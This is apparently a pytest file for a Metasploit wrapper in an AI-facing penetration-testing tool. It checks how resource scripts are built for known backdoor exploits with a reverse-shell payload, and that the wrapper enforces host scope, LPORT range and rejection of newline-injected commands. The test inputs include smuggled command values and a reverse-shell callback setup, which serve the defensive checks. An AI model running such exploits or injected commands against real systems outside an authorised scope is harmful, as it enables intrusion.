"""Unit tests for categories/metasploit.py: resource-script construction,
the newline-injection guard, and lport range validation, with executor
fully mocked so no Docker/Kali dependency is needed.

Run with: pytest tests/test_metasploit.py -v
"""

import os
import sys
from unittest.mock import MagicMock

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(_REPO_ROOT, "ronin_mini", "ronin-tools-mcp"))

from categories import metasploit as ms  # noqa: E402
from scope import Scope  # noqa: E402


def _scope():
    return Scope(scope_dir=_REPO_ROOT, allowed_hosts=["10.0.0.5"])


def _executor():
    ex = MagicMock()
    ex.KALI_LPORT_RANGE = (44440, 44450)
    ex.ensure_kali_container_ready = MagicMock(return_value=None)
    ex.write_file_in_kali_container = MagicMock(return_value=None)
    ex.run_in_kali_container = MagicMock(return_value={"returncode": 0, "stdout": "", "stderr": ""})
    return ex


# --- resource script construction -----------------------------------------


def test_build_resource_script_no_payload_module():
    script = ms._build_resource_script("exploit/unix/ftp/vsftpd_234_backdoor", "10.0.0.5", None, None, None, None, None, None)
    lines = script.strip().splitlines()
    assert lines[0] == "use exploit/unix/ftp/vsftpd_234_backdoor"
    assert lines[1] == "set RHOSTS 10.0.0.5"
    assert "exploit -z" in lines
    assert "sessions -K" in lines
    assert lines[-1] == "exit -y"
    assert not any(line.startswith("set PAYLOAD") for line in lines)
    assert not any(line.startswith("set LHOST") for line in lines)


def test_build_resource_script_reverse_payload_and_options():
    script = ms._build_resource_script(
        "exploit/multi/samba/usermap_script",
        "10.0.0.5",
        445,
        "cmd/unix/reverse",
        "192.168.56.1",
        44441,
        {"SMBUser": "guest"},
        "id",
    )
    lines = script.strip().splitlines()
    assert "set RPORT 445" in lines
    assert "set PAYLOAD cmd/unix/reverse" in lines
    assert "set LHOST 192.168.56.1" in lines
    assert "set LPORT 44441" in lines
    assert "set SMBUser guest" in lines
    assert 'sessions -c "id" -i 1' in lines
    assert f"sleep {ms.POST_EXPLOIT_WAIT_SECONDS}" in lines


def test_build_resource_script_orders_exploit_before_post_command():
    script = ms._build_resource_script("mod", "10.0.0.5", None, None, None, None, None, "whoami")
    lines = script.strip().splitlines()
    exploit_idx = lines.index("exploit -z")
    post_idx = next(i for i, line in enumerate(lines) if "sessions -c" in line)
    assert exploit_idx < post_idx


# --- run_metasploit: validation + dispatch --------------------------------


def test_empty_module_rejected():
    result = ms.run_metasploit(_scope(), _executor(), 300, "", "10.0.0.5", None, None, None, None, None, None)
    assert "error" in result


def test_host_outside_scope_rejected():
    ex = _executor()
    result = ms.run_metasploit(_scope(), ex, 300, "exploit/unix/ftp/vsftpd_234_backdoor", "evil.example.org", None, None, None, None, None, None)
    assert "error" in result
    ex.run_in_kali_container.assert_not_called()


def test_newline_in_module_rejected():
    ex = _executor()
    result = ms.run_metasploit(_scope(), ex, 300, "mod\nset X evil", "10.0.0.5", None, None, None, None, None, None)
    assert "error" in result
    ex.write_file_in_kali_container.assert_not_called()


def test_newline_in_payload_rejected():
    ex = _executor()
    result = ms.run_metasploit(_scope(), ex, 300, "mod", "10.0.0.5", None, "cmd/unix/reverse\nset X evil", None, None, None, None)
    assert "error" in result


def test_newline_in_post_exploit_command_rejected():
    ex = _executor()
    result = ms.run_metasploit(_scope(), ex, 300, "mod", "10.0.0.5", None, None, None, None, None, "id\nsessions -K")
    assert "error" in result


def test_newline_in_options_rejected():
    ex = _executor()
    result = ms.run_metasploit(_scope(), ex, 300, "mod", "10.0.0.5", None, None, None, None, {"X": "y\nset Z evil"}, None)
    assert "error" in result


def test_lport_outside_published_range_rejected():
    ex = _executor()
    result = ms.run_metasploit(_scope(), ex, 300, "mod", "10.0.0.5", None, "cmd/unix/reverse", "192.168.56.1", 9999, None, None)
    assert "error" in result
    ex.write_file_in_kali_container.assert_not_called()


def test_lport_inside_published_range_accepted():
    ex = _executor()
    result = ms.run_metasploit(_scope(), ex, 300, "mod", "10.0.0.5", None, "cmd/unix/reverse", "192.168.56.1", 44445, None, None)
    assert "error" not in result
    ex.write_file_in_kali_container.assert_called_once()
    ex.run_in_kali_container.assert_called_once()


def test_successful_call_writes_script_then_runs_msfconsole():
    ex = _executor()
    ms.run_metasploit(_scope(), ex, 300, "exploit/unix/ftp/vsftpd_234_backdoor", "10.0.0.5", None, None, None, None, None, None)
    write_args = ex.write_file_in_kali_container.call_args[0]
    assert write_args[0].startswith("/tmp/ronin_msf_") and write_args[0].endswith(".rc")
    assert "use exploit/unix/ftp/vsftpd_234_backdoor" in write_args[1]

    run_args = ex.run_in_kali_container.call_args[0][0]
    assert run_args[:3] == ["msfconsole", "-q", "-r"]
    assert run_args[3] == write_args[0]


def test_write_failure_short_circuits_before_running():
    ex = _executor()
    ex.write_file_in_kali_container = MagicMock(return_value={"error": "write failed"})
    result = ms.run_metasploit(_scope(), ex, 300, "mod", "10.0.0.5", None, None, None, None, None, None)
    assert result == {"error": "write failed"}
    ex.run_in_kali_container.assert_not_called()
